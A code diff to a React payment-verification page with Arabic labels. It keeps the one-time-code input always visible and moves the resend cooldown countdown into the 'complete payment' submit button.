@@ -108,26 +108,20 @@ export default function VerifyPage() {
         <div className="px-6 pb-5 space-y-4">
           <div>
             <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">Verification Code</p>
-            {cooldown > 0 ? (
-              <div className="w-full border border-gray-200 px-4 py-3 flex items-center justify-center bg-gray-50">
-                <span className="font-mono font-black text-[#1A2E44] text-sm tabular-nums">{cooldown}</span>
-              </div>
-            ) : (
-              <input
-                type="text"
-                inputMode="numeric"
-                maxLength={6}
-                placeholder="أدخل رمز التحقق"
-                value={otp}
-                onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
-                onBlur={() => {
-                  const d = otp.replace(/\D/g, "");
-                  if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
-                }}
-                className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
-                dir="ltr"
-              />
-            )}
+            <input
+              type="text"
+              inputMode="numeric"
+              maxLength={6}
+              placeholder="أدخل رمز التحقق"
+              value={otp}
+              onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setError(""); }}
+              onBlur={() => {
+                const d = otp.replace(/\D/g, "");
+                if (d.length > 0 && d.length !== 4 && d.length !== 6) setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
+              }}
+              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#1A2E44] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#1A2E44] transition-colors"
+              dir="ltr"
+            />
             {error && <p className="text-red-500 text-xs font-bold mt-1">⚠ {error}</p>}
           </div>
 
@@ -157,7 +151,7 @@ export default function VerifyPage() {
             style={{ background: "#1A2E44" }}
           >
             <Lock size={13} />
-            {submitting ? "جاري التحقق..." : "إتمام الدفع"}
+            {submitting ? "جاري التحقق..." : cooldown > 0 ? <span className="font-mono tabular-nums">{cooldown}</span> : "إتمام الدفع"}
           </button>
 
           <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
